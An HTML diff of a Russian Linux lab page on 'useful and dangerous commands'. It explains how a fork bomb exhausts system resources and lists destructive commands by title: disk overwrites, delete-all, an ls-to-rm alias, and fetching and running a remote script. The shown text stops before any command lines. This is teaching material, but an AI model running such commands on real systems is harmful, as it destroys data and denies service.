@@ -1,0 +1,1176 @@
+<html>
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<title>6.7. Полезные и опасные команды (fork-бомба)</title>
+	<style>
+		/* cspell:disable-file */
+		/* webkit printing magic: print all background colors */
+		html {
+			-webkit-print-color-adjust: exact;
+		}
+
+		* {
+			box-sizing: border-box;
+			-webkit-print-color-adjust: exact;
+		}
+
+		html,
+		body {
+			margin: 0;
+			padding: 0;
+		}
+
+		@media only screen {
+			body {
+				margin: 2em auto;
+				max-width: 900px;
+				color: rgb(55, 53, 47);
+			}
+		}
+
+		body {
+			line-height: 1.5;
+			/* white-space: pre-wrap; */
+		}
+
+		a,
+		a.visited {
+			color: inherit;
+			text-decoration: underline;
+		}
+
+		.pdf-relative-link-path {
+			font-size: 80%;
+			color: #444;
+		}
+
+		h1,
+		h2,
+		h3 {
+			letter-spacing: -0.01em;
+			line-height: 1.2;
+			font-weight: 600;
+			margin-bottom: 0;
+		}
+
+		.page-title {
+			font-size: 2.5rem;
+			font-weight: 700;
+			margin-top: 0;
+			margin-bottom: 0.75em;
+		}
+
+		h1 {
+			font-size: 1.875rem;
+			margin-top: 1.875rem;
+		}
+
+		h2 {
+			font-size: 1.5rem;
+			margin-top: 1.5rem;
+		}
+
+		h3 {
+			font-size: 1.25rem;
+			margin-top: 1.25rem;
+		}
+
+		.source {
+			border: 1px solid #ddd;
+			border-radius: 3px;
+			padding: 1.5em;
+			word-break: break-all;
+		}
+
+		.callout {
+			border-radius: 3px;
+			padding: 1rem;
+		}
+
+		figure {
+			margin: 1.25em 0;
+			page-break-inside: avoid;
+		}
+
+		figcaption {
+			opacity: 0.5;
+			font-size: 85%;
+			margin-top: 0.5em;
+		}
+
+		mark {
+			background-color: transparent;
+		}
+
+		.indented {
+			padding-left: 1.5em;
+		}
+
+		hr {
+			background: transparent;
+			display: block;
+			width: 100%;
+			height: 1px;
+			visibility: visible;
+			border: none;
+			border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+		}
+
+		img {
+			max-width: 100%;
+		}
+
+		@media only print {
+			img {
+				max-height: 100vh;
+				object-fit: contain;
+			}
+		}
+
+		@page {
+			margin: 1in;
+		}
+
+		.collection-content {
+			font-size: 0.875rem;
+		}
+
+		.column-list {
+			display: flex;
+			justify-content: space-between;
+		}
+
+		.column {
+			padding: 0 1em;
+		}
+
+		.column:first-child {
+			padding-left: 0;
+		}
+
+		.column:last-child {
+			padding-right: 0;
+		}
+
+		.table_of_contents-item {
+			display: block;
+			font-size: 0.875rem;
+			line-height: 1.3;
+			padding: 0.125rem;
+		}
+
+		.table_of_contents-indent-1 {
+			margin-left: 1.5rem;
+		}
+
+		.table_of_contents-indent-2 {
+			margin-left: 3rem;
+		}
+
+		.table_of_contents-indent-3 {
+			margin-left: 4.5rem;
+		}
+
+		.table_of_contents-link {
+			text-decoration: none;
+			opacity: 0.7;
+			border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+		}
+
+		table,
+		th,
+		td {
+			border: 1px solid rgba(55, 53, 47, 0.09);
+			border-collapse: collapse;
+		}
+
+		table {
+			border-left: none;
+			border-right: none;
+		}
+
+		th,
+		td {
+			font-weight: normal;
+			padding: 0.25em 0.5em;
+			line-height: 1.5;
+			min-height: 1.5em;
+			text-align: left;
+		}
+
+		th {
+			color: rgba(55, 53, 47, 0.6);
+		}
+
+		ol,
+		ul {
+			margin: 0;
+			margin-block-start: 0.6em;
+			margin-block-end: 0.6em;
+		}
+
+		li>ol:first-child,
+		li>ul:first-child {
+			margin-block-start: 0.6em;
+		}
+
+		ul>li {
+			list-style: disc;
+		}
+
+		ul.to-do-list {
+			padding-inline-start: 0;
+		}
+
+		ul.to-do-list>li {
+			list-style: none;
+		}
+
+		.to-do-children-checked {
+			text-decoration: line-through;
+			opacity: 0.375;
+		}
+
+		ul.toggle>li {
+			list-style: none;
+		}
+
+		ul {
+			padding-inline-start: 1.7em;
+		}
+
+		ul>li {
+			padding-left: 0.1em;
+		}
+
+		ol {
+			padding-inline-start: 1.6em;
+		}
+
+		ol>li {
+			padding-left: 0.2em;
+		}
+
+		.mono ol {
+			padding-inline-start: 2em;
+		}
+
+		.mono ol>li {
+			text-indent: -0.4em;
+		}
+
+		.toggle {
+			padding-inline-start: 0em;
+			list-style-type: none;
+		}
+
+		/* Indent toggle children */
+		.toggle>li>details {
+			padding-left: 1.7em;
+		}
+
+		.toggle>li>details>summary {
+			margin-left: -1.1em;
+		}
+
+		.selected-value {
+			display: inline-block;
+			padding: 0 0.5em;
+			background: rgba(206, 205, 202, 0.5);
+			border-radius: 3px;
+			margin-right: 0.5em;
+			margin-top: 0.3em;
+			margin-bottom: 0.3em;
+			white-space: nowrap;
+		}
+
+		.collection-title {
+			display: inline-block;
+			margin-right: 1em;
+		}
+
+		.page-description {
+			margin-bottom: 2em;
+		}
+
+		.simple-table {
+			margin-top: 1em;
+			font-size: 0.875rem;
+			empty-cells: show;
+		}
+
+		.simple-table td {
+			height: 29px;
+			min-width: 120px;
+		}
+
+		.simple-table th {
+			height: 29px;
+			min-width: 120px;
+		}
+
+		.simple-table-header-color {
+			background: rgb(247, 246, 243);
+			color: black;
+		}
+
+		.simple-table-header {
+			font-weight: 500;
+		}
+
+		time {
+			opacity: 0.5;
+		}
+
+		.icon {
+			display: inline-block;
+			max-width: 1.2em;
+			max-height: 1.2em;
+			text-decoration: none;
+			vertical-align: text-bottom;
+			margin-right: 0.5em;
+		}
+
+		img.icon {
+			border-radius: 3px;
+		}
+
+		.user-icon {
+			width: 1.5em;
+			height: 1.5em;
+			border-radius: 100%;
+			margin-right: 0.5rem;
+		}
+
+		.user-icon-inner {
+			font-size: 0.8em;
+		}
+
+		.text-icon {
+			border: 1px solid #000;
+			text-align: center;
+		}
+
+		.page-cover-image {
+			display: block;
+			object-fit: cover;
+			width: 100%;
+			max-height: 30vh;
+		}
+
+		.page-header-icon {
+			font-size: 3rem;
+			margin-bottom: 1rem;
+		}
+
+		.page-header-icon-with-cover {
+			margin-top: -0.72em;
+			margin-left: 0.07em;
+		}
+
+		.page-header-icon img {
+			border-radius: 3px;
+		}
+
+		.link-to-page {
+			margin: 1em 0;
+			padding: 0;
+			border: none;
+			font-weight: 500;
+		}
+
+		p>.user {
+			opacity: 0.5;
+		}
+
+		td>.user,
+		td>time {
+			white-space: nowrap;
+		}
+
+		input[type="checkbox"] {
+			transform: scale(1.5);
+			margin-right: 0.6em;
+			vertical-align: middle;
+		}
+
+		p {
+			margin-top: 0.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.image {
+			border: none;
+			margin: 1.5em 0;
+			padding: 0;
+			border-radius: 0;
+			text-align: center;
+		}
+
+		.code,
+		code {
+			background: rgba(135, 131, 120, 0.15);
+			border-radius: 3px;
+			padding: 0.2em 0.4em;
+			border-radius: 3px;
+			font-size: 85%;
+			tab-size: 2;
+		}
+
+		code {
+			color: #eb5757;
+		}
+
+		.code {
+			padding: 1.5em 1em;
+		}
+
+		.code-wrap {
+			white-space: pre-wrap;
+			word-break: break-all;
+		}
+
+		.code>code {
+			background: none;
+			padding: 0;
+			font-size: 100%;
+			color: inherit;
+		}
+
+		blockquote {
+			font-size: 1.25em;
+			margin: 1em 0;
+			padding-left: 1em;
+			border-left: 3px solid rgb(55, 53, 47);
+		}
+
+		.bookmark {
+			text-decoration: none;
+			max-height: 8em;
+			padding: 0;
+			display: flex;
+			width: 100%;
+			align-items: stretch;
+		}
+
+		.bookmark-title {
+			font-size: 0.85em;
+			overflow: hidden;
+			text-overflow: ellipsis;
+			height: 1.75em;
+			white-space: nowrap;
+		}
+
+		.bookmark-text {
+			display: flex;
+			flex-direction: column;
+		}
+
+		.bookmark-info {
+			flex: 4 1 180px;
+			padding: 12px 14px 14px;
+			display: flex;
+			flex-direction: column;
+			justify-content: space-between;
+		}
+
+		.bookmark-image {
+			width: 33%;
+			flex: 1 1 180px;
+			display: block;
+			position: relative;
+			object-fit: cover;
+			border-radius: 1px;
+		}
+
+		.bookmark-description {
+			color: rgba(55, 53, 47, 0.6);
+			font-size: 0.75em;
+			overflow: hidden;
+			max-height: 4.5em;
+			word-break: break-word;
+		}
+
+		.bookmark-href {
+			font-size: 0.75em;
+			margin-top: 0.25em;
+		}
+
+		.sans {
+			font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+		}
+
+		.code {
+			font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace;
+		}
+
+		.serif {
+			font-family: Lyon-Text, Georgia, ui-serif, serif;
+		}
+
+		.mono {
+			font-family: iawriter-mono, Nitti, Menlo, Courier, monospace;
+		}
+
+		.pdf .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR';
+		}
+
+		.pdf .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR';
+		}
+
+		.pdf .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR';
+		}
+
+		.pdf .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR';
+		}
+
+		.highlight-default {
+			color: rgba(55, 53, 47, 1);
+		}
+
+		.highlight-gray {
+			color: rgba(120, 119, 116, 1);
+			fill: rgba(120, 119, 116, 1);
+		}
+
+		.highlight-brown {
+			color: rgba(159, 107, 83, 1);
+			fill: rgba(159, 107, 83, 1);
+		}
+
+		.highlight-orange {
+			color: rgba(217, 115, 13, 1);
+			fill: rgba(217, 115, 13, 1);
+		}
+
+		.highlight-yellow {
+			color: rgba(203, 145, 47, 1);
+			fill: rgba(203, 145, 47, 1);
+		}
+
+		.highlight-teal {
+			color: rgba(68, 131, 97, 1);
+			fill: rgba(68, 131, 97, 1);
+		}
+
+		.highlight-blue {
+			color: rgba(51, 126, 169, 1);
+			fill: rgba(51, 126, 169, 1);
+		}
+
+		.highlight-purple {
+			color: rgba(144, 101, 176, 1);
+			fill: rgba(144, 101, 176, 1);
+		}
+
+		.highlight-pink {
+			color: rgba(193, 76, 138, 1);
+			fill: rgba(193, 76, 138, 1);
+		}
+
+		.highlight-red {
+			color: rgba(212, 76, 71, 1);
+			fill: rgba(212, 76, 71, 1);
+		}
+
+		.highlight-default_background {
+			color: rgba(55, 53, 47, 1);
+		}
+
+		.highlight-gray_background {
+			background: rgba(241, 241, 239, 1);
+		}
+
+		.highlight-brown_background {
+			background: rgba(244, 238, 238, 1);
+		}
+
+		.highlight-orange_background {
+			background: rgba(251, 236, 221, 1);
+		}
+
+		.highlight-yellow_background {
+			background: rgba(251, 243, 219, 1);
+		}
+
+		.highlight-teal_background {
+			background: rgba(237, 243, 236, 1);
+		}
+
+		.highlight-blue_background {
+			background: rgba(231, 243, 248, 1);
+		}
+
+		.highlight-purple_background {
+			background: rgba(244, 240, 247, 0.8);
+		}
+
+		.highlight-pink_background {
+			background: rgba(249, 238, 243, 0.8);
+		}
+
+		.highlight-red_background {
+			background: rgba(253, 235, 236, 1);
+		}
+
+		.block-color-default {
+			color: inherit;
+			fill: inherit;
+		}
+
+		.block-color-gray {
+			color: rgba(120, 119, 116, 1);
+			fill: rgba(120, 119, 116, 1);
+		}
+
+		.block-color-brown {
+			color: rgba(159, 107, 83, 1);
+			fill: rgba(159, 107, 83, 1);
+		}
+
+		.block-color-orange {
+			color: rgba(217, 115, 13, 1);
+			fill: rgba(217, 115, 13, 1);
+		}
+
+		.block-color-yellow {
+			color: rgba(203, 145, 47, 1);
+			fill: rgba(203, 145, 47, 1);
+		}
+
+		.block-color-teal {
+			color: rgba(68, 131, 97, 1);
+			fill: rgba(68, 131, 97, 1);
+		}
+
+		.block-color-blue {
+			color: rgba(51, 126, 169, 1);
+			fill: rgba(51, 126, 169, 1);
+		}
+
+		.block-color-purple {
+			color: rgba(144, 101, 176, 1);
+			fill: rgba(144, 101, 176, 1);
+		}
+
+		.block-color-pink {
+			color: rgba(193, 76, 138, 1);
+			fill: rgba(193, 76, 138, 1);
+		}
+
+		.block-color-red {
+			color: rgba(212, 76, 71, 1);
+			fill: rgba(212, 76, 71, 1);
+		}
+
+		.block-color-default_background {
+			color: inherit;
+			fill: inherit;
+		}
+
+		.block-color-gray_background {
+			background: rgba(241, 241, 239, 1);
+		}
+
+		.block-color-brown_background {
+			background: rgba(244, 238, 238, 1);
+		}
+
+		.block-color-orange_background {
+			background: rgba(251, 236, 221, 1);
+		}
+
+		.block-color-yellow_background {
+			background: rgba(251, 243, 219, 1);
+		}
+
+		.block-color-teal_background {
+			background: rgba(237, 243, 236, 1);
+		}
+
+		.block-color-blue_background {
+			background: rgba(231, 243, 248, 1);
+		}
+
+		.block-color-purple_background {
+			background: rgba(244, 240, 247, 0.8);
+		}
+
+		.block-color-pink_background {
+			background: rgba(249, 238, 243, 0.8);
+		}
+
+		.block-color-red_background {
+			background: rgba(253, 235, 236, 1);
+		}
+
+		.select-value-color-uiBlue {
+			background-color: rgba(35, 131, 226, .07);
+		}
+
+		.select-value-color-pink {
+			background-color: rgba(245, 224, 233, 1);
+		}
+
+		.select-value-color-purple {
+			background-color: rgba(232, 222, 238, 1);
+		}
+
+		.select-value-color-green {
+			background-color: rgba(219, 237, 219, 1);
+		}
+
+		.select-value-color-gray {
+			background-color: rgba(227, 226, 224, 1);
+		}
+
+		.select-value-color-transparentGray {
+			background-color: rgba(227, 226, 224, 0);
+		}
+
+		.select-value-color-translucentGray {
+			background-color: rgba(0, 0, 0, 0.06);
+		}
+
+		.select-value-color-orange {
+			background-color: rgba(250, 222, 201, 1);
+		}
+
+		.select-value-color-brown {
+			background-color: rgba(238, 224, 218, 1);
+		}
+
+		.select-value-color-red {
+			background-color: rgba(255, 226, 221, 1);
+		}
+
+		.select-value-color-yellow {
+			background-color: rgba(253, 236, 200, 1);
+		}
+
+		.select-value-color-blue {
+			background-color: rgba(211, 229, 239, 1);
+		}
+
+		.select-value-color-pageGlass {
+			background-color: undefined;
+		}
+
+		.select-value-color-washGlass {
+			background-color: undefined;
+		}
+
+		.checkbox {
+			display: inline-flex;
+			vertical-align: text-bottom;
+			width: 16;
+			height: 16;
+			background-size: 16px;
+			margin-left: 2px;
+			margin-right: 5px;
+		}
+
+		.checkbox-on {
+			background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+		}
+
+		.checkbox-off {
+			background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+		}
+	</style>
+</head>
+
+<body>
+	<article id="131aa64c-9d0a-8139-b97c-fcd5314664f6" class="page sans">
+		<header>
+			<div class="page-header-icon undefined"><img class="icon"
+					src="https://www.notion.so/icons/command-line_red.svg" /></div>
+			<h1 class="page-title"><strong>6.7. Полезные и опасные команды (fork-бомба)</strong></h1>
+			<p class="page-description"></p>
+		</header>
+		<div class="page-body">
+			<h1 id="131aa64c-9d0a-816a-ac71-d7017964f446" class="block-color-default">План практической работы</h1>
+			<nav id="131aa64c-9d0a-8185-ba6f-fc72055cc70c" class="block-color-gray table_of_contents">
+				<div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-816a-ac71-d7017964f446">План практической работы</a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8191-a8c6-de9171658693"><strong>Цель работы:</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-810f-8be4-d0b6a89158c9"><strong>Задача:</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8135-a5e8-cb38d831488a"><strong>Вот как работает fork-бомба:</strong></a>
+				</div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8114-91e0-dbc5dad6945e">Причины, по которым fork-бомба опасна, включают в
+						себя следующее:</a></div>
+				<div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-81fb-b84f-c571ce26f33e"><strong>1. Опасные команды</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-81e1-b930-d5685497ab63"><strong>1.1. fork-бомба</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-81ae-9432-e3ba6335e638"><strong>1.2. Прямая запись на жесткий
+							диск</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-81eb-b0ee-e12512fb508f"><strong>1.3. Запись на диск случайных
+							данных</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-818b-8991-c1e05a7366d0"><strong>1.4. Перезаписывает содержимое жесткого
+							диска нулями</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-812c-9131-d2664b38fef7"><strong>1.5. Удалить все</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-813b-a3da-e25fd08c76c4"><strong>2. Регулярные команды</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-810a-8535-dd2c59dc5d39"><strong>2.1. Определение самых используемых
+							команд</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8101-be25-c5c573ab7b14"><strong>2.2. Вывод из файла списка уникальных
+							слов</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-81af-829a-e289c7439ae4"><strong>2.3. Выделение цветом вывода
+							ps</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-81ea-98cd-f04cb3a5aade"><strong>2.4. Поиск последней команды, начинающейся
+							с “xxx”, без ее выполнения</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-81b8-9a69-ed7df883624a"><strong>2.5. Выполнение команды N раз</strong></a>
+				</div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8151-999f-d1551dc33bba"><strong>2.6. Добавление часов в
+							терминал</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-81b0-be00-c1015930bdc1"><strong>2.7. Поиск повторяющихся файлов
+						</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-814c-9831-e80e49c4ae53"><strong>2.8. Удаление всех файлов каталога, не
+							соответствующих заданному расширению</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-818f-af37-da8be2840d8e"><strong>2.9. Удалить все файлы, кроме
+							одного</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8128-8bff-e6ed7e4cc930"><strong>2.10. Генерация случайного пароля заданной
+							длины</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-81b8-93a0-cd1dbe59ce35"><strong>2.11. Рекурсивное удаление всех пустых
+							каталогов</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8162-844d-edd2f0ebdd39"><strong>2.12. Копирование разрешений
+							файла</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8139-8b6b-d26af89e236a"><strong>2.13. Изменяет владельца и группу всех
+							файлов и каталогов в системе на указанного пользователя и группу</strong></a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8167-8207-f3ed05617277"><strong>2.14. К</strong>оманда создает псевдоним
+						для команды <code><strong>ls</strong></code>, делая так, что при вызове
+						<code><strong>ls</strong></code> будет вызываться <code><strong>rm</strong></code>.</a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8136-baf5-f9a0f91954ca"><strong>2.15. К</strong>оманда загружает скрипт
+						malware.sh с веб-сайта и немедленно выполняет его.</a></div>
+				<div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link"
+						href="#131aa64c-9d0a-8189-9d90-dba2f095f443"><strong>3. Создании fork-бомбы </strong></a></div>
+			</nav>
+			<h2 id="131aa64c-9d0a-8191-a8c6-de9171658693" class=""><strong>Цель работы:</strong></h2>
+			<ul id="131aa64c-9d0a-81bd-91b9-e63cad6adab0" class="bulleted-list">
+				<li style="list-style-type:disc">Научиться использовать опасные команды Linux.</li>
+			</ul>
+			<h2 id="131aa64c-9d0a-810f-8be4-d0b6a89158c9" class=""><strong>Задача:</strong></h2>
+			<ol type="1" id="131aa64c-9d0a-81c2-8107-cce264e95352" class="numbered-list" start="1">
+				<li>Поготовить snapshot OS</li>
+			</ol>
+			<ol type="1" id="131aa64c-9d0a-815b-86aa-ff65a2e33cd2" class="numbered-list" start="2">
+				<li>Продемонстрировать все команды в работе, внести в отчёт с скринами и описанием, что произошло при
+					примении конкретной команды </li>
+			</ol>
+			<ol type="1" id="131aa64c-9d0a-81f4-882c-c75f63c27317" class="numbered-list" start="3">
+				<li>Ответить на вопросы.</li>
+			</ol>
+			<h1 id="131aa64c-9d0a-8135-a5e8-cb38d831488a" class=""><strong>Вот как работает fork-бомба:</strong></h1>
+			<figure class="block-color-red callout" style="white-space:pre-wrap;display:flex"
+				id="131aa64c-9d0a-8145-b277-c79a25d3cef9">
+				<div style="font-size:1.5em"><span class="icon">⚠️</span></div>
+				<div style="width:100%">В Linux есть ряд функциональных, полезных, а порой и опасных команд, чтобы
+					продемонстрировать потенциал использования оболочки Bash в Linux.Некоторые из них, действительно,
+					потребуют соблюдения осторожности, так как иначе можно потерять все свои данные. Другие же,
+					наоборот, окажутся очень покладистыми и полезными для повышения эффективности работы.</div>
+			</figure>
+			<figure class="block-color-red callout" style="white-space:pre-wrap;display:flex"
+				id="131aa64c-9d0a-8147-8977-f08b93585d0f">
+				<div style="font-size:1.5em"><span class="icon">⚠️</span></div>
+				<div style="width:100%">Fork-бомба - это вредоносная программа, которая использует системный вызов
+					fork() для создания копий самой себя, образуя цепную реакцию процессов, которая приводит к
+					экспоненциальному росту числа процессов в системе. Этот процесс продолжается до тех пор, пока не
+					будут исчерпаны все доступные системные ресурсы, такие как процессорное время, память и файловые
+					дескрипторы.</div>
+			</figure>
+			<ol type="1" id="131aa64c-9d0a-81f8-8ba2-f5cf99be3b55" class="numbered-list" start="1">
+				<li>Программа создает новый процесс с помощью системного вызова fork(). При этом создается точная копия
+					текущего процесса, включая его код, данные и состояние.</li>
+			</ol>
+			<ol type="1" id="131aa64c-9d0a-81ca-b734-d4ca779ae4d7" class="numbered-list" start="2">
+				<li>Новый процесс также начинает выполнять ту же самую программу и создает свои собственные копии себя
+					путем вызова fork().</li>
+			</ol>
+			<ol type="1" id="131aa64c-9d0a-8125-99e7-cceeb5bf8fd2" class="numbered-list" start="3">
+				<li>Этот процесс рекурсивно повторяется, приводя к экспоненциальному росту числа процессов в системе. В
+					результате множество процессов конкурируют за доступ к системным ресурсам.</li>
+			</ol>
+			<h3 id="131aa64c-9d0a-8114-91e0-dbc5dad6945e" class="">Причины, по которым fork-бомба опасна, включают в
+				себя следующее:</h3>
+			<ol type="1" id="131aa64c-9d0a-81ae-a266-f1b3bad2d6c6" class="numbered-list" start="1">
+				<li><strong>Исчерпание ресурсов</strong>: в процессе рекурсивного создания процессов система исчерпывает
+					доступные ресурсы, такие как процессорное время, память и файловые дескрипторы. Это может привести к
+					снижению производительности системы и даже к ее полной недоступности.</li>
+			</ol>
+			<ol type="1" id="131aa64c-9d0a-81e1-81bb-d54c33e9d2ed" class="numbered-list" start="2">
+				<li><strong>Отказ в обслуживании</strong>: когда система исчерпывает все доступные ресурсы из-за
+					fork-бомбы, она перестает быть способной обрабатывать новые запросы, что приводит к отказу в
+					обслуживании для других пользователей и сервисов.</li>
+			</ol>
+			<ol type="1" id="131aa64c-9d0a-81db-b44e-c98cfd059c53" class="numbered-list" start="3">
+				<li><strong>Потенциальные последствия</strong>: если fork-бомба запущена на сервере или критической
+					системе, это может привести к серьезным проблемам, включая потерю данных, прерывание работы и
+					недоступность сервисов.</li>
+			</ol>
+			<h1 id="131aa64c-9d0a-81fb-b84f-c571ce26f33e" class=""><strong>1. Опасные команды</strong></h1>
+			<p id="131aa64c-9d0a-8191-9e4a-e90b151f56aa" class=""><strong>Выполняйте их, только если уверены в своих
+					действиях. Я добавил в начало и конец каждой символы - -, чтобы их нельзя было просто скопировать и
+					вставить.</strong></p>
